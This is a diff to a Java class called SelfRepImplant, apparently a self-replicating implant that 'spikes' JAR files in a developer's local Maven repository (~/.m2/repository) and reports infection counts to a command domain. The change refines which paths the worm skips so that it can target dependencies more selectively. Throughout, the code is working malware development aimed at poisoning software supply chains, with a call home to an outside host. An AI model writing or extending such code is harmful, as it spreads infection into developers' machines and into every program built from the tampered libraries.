@@ -26,7 +26,14 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
      * All JARs in this directory will be spiked.
      */
     static volatile String CONF_LIMIT_PATH = "~/.m2/repository";
-    static volatile List<String> CONF_IGNORED_PATHS = Arrays.asList("plugin", "plugins", "plexus", "surefire", "junit", "maven", "apache");
+
+    /**
+     * Paths that should be left alone.
+     * This is a huge string with full paths separated by ';'.
+     * Example: "~/.m2/repository/org/apache/maven;~/.m2/repository/org/springframework/boot"
+     */
+    static volatile String CONF_IGNORED_PATHS;
+
     /**
      * Domain to report home to.
      */
@@ -86,7 +93,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         Set<Path> jarsToImplant;
         try {
-            jarsToImplant = findAllJars(CONF_LIMIT_PATH);
+            jarsToImplant = findAllJars(CONF_LIMIT_PATH, CONF_IGNORED_PATHS);
         } catch (Exception e) {
             System.out.println("[!] Failed to find JARs.");
             e.printStackTrace();
@@ -143,20 +150,49 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         callHpme(CONF_DOMAIN, "did-" + numInfected, id);
     }
 
-    public static Set<Path> findAllJars(String root) throws IllegalArgumentException {
+    public static Set<Path> findAllJars(String root, String ignoreSpec) throws IllegalArgumentException {
+        root = expandPath(root);
+
         Path dir = Path.of(root);
         if (!Files.isDirectory(dir)) {
             throw new IllegalArgumentException("Not a directory");
         }
 
+        // Convert provided Strings to actual Path objects
+        String[] ignoreSpecSplit = ignoreSpec.split(";");
+        Set<Path> ignorePaths = new HashSet<>(ignoreSpecSplit.length);
+        for (String pathSpec : ignoreSpecSplit) {
+            pathSpec = expandPath(pathSpec);
+            Path actualPath = Path.of(pathSpec);
+            ignorePaths.add(actualPath);
+        }
+
+        // Recurse through the file structure
         Set<Path> validJarFiles = new HashSet<>();
-        findAllJars(dir, validJarFiles);
+        findAllJars(dir, validJarFiles, Collections.unmodifiableSet(ignorePaths));
 
         return validJarFiles;
     }
 
+    // Java does not natively support the ~ shorthand path. Expand it manually.
+    private static String expandPath(String pathSpec) {
+        if (pathSpec.contains("~")) {
+            String home = System.getProperty("user.home");
+            if (home == null) {
+                throw new IllegalArgumentException("Cannot find home directory.");
+            }
+
+            pathSpec = pathSpec.replace("~", home);
+        }
+        return pathSpec;
+    }
+
     // Recursive function
-    private static void findAllJars(Path dir, Set<Path> accumulator) {
+    private static void findAllJars(Path dir, Set<Path> accumulator, Set<Path> ignoredPaths) {
+        if (ignoredPaths.contains(dir)) {
+            return;
+        }
+
         List<Path> subPaths;
         try {
             subPaths = Files.list(dir).toList();
@@ -166,9 +202,6 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         List<Path> subDirs = new LinkedList<>();
         for (Path subPath : subPaths) {
-            if (CONF_IGNORED_PATHS.contains(subPath.getFileName().toString())) {
-                continue;
-            }
             if (Files.isDirectory(subPath)) {
                 subDirs.add(subPath);
                 continue;
@@ -191,7 +224,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
 
         for (Path subDir : subDirs) {
-            findAllJars(subDir, accumulator);
+            findAllJars(subDir, accumulator, ignoredPaths);
         }
     }
 
